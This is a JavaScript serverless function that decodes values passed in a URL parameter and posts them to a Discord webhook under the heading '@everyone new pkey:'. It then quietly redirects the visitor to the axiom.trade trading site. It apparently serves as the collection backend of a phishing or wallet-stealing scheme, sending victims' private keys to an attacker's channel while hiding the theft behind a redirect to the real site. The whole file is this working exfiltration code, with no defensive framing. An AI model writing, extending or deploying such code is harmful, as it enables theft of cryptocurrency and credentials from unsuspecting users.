exports.handler = async (event) => {
  const encodedId = event.queryStringParameters && event.queryStringParameters.id;

  if (!encodedId) {
    return {
      statusCode: 400,
      body: "Missing id parameter",
    };
  }

  let decoded;
  try {
    decoded = Buffer.from(encodedId, "base64").toString("utf8");
  } catch (error) {
    console.error("Base64 decode error:", error);
    return {
      statusCode: 400,
      body: "Invalid base64 string",
    };
  }

  let values;
  try {
    const parsed = JSON.parse(decoded); 
    if (Array.isArray(parsed)) {
      values = parsed;
    } else {
      throw new Error("Not array");
    }
  } catch (e) {
    values = decoded.split(",").map((v) => v.trim());
  }

  values = values
    .map((v) =>
      v
        .replace(/^\s*"?\s*\[?/, "")  
        .replace(/"?\s*\]?\s*$/, "")  
        .trim()
    )
    .filter(Boolean); 

  if (!values.length) {
    console.error("No values after cleaning:", decoded);
    return {
      statusCode: 400,
      body: "No values found in decoded data",
    };
  }

  const escapeDiscord = (s) => s.replace(/`/g, "\\`"); 

  const lines = values
    .map((v, i) => `${i + 1}. \`${escapeDiscord(v)}\``)
    .join("\n");

  const content = `@everyone new pkey:\n${lines}`;

  const webhookUrl = process.env.DISCORD_WEBHOOK_URL; 

  if (!webhookUrl) {
    console.error("DISCORD_WEBHOOK_URL is not set");
  } else {
    try {
      const resp = await fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content }),
      });

      const bodyText = await resp.text();
      console.log("Discord response status:", resp.status);
      console.log("Discord response body:", bodyText);
    } catch (err) {
      console.error("Failed to send Discord webhook:", err);
    }
  }

  return {
    statusCode: 302,
    headers: {
      Location: "https://axiom.trade?id=1",
    },
  };
};
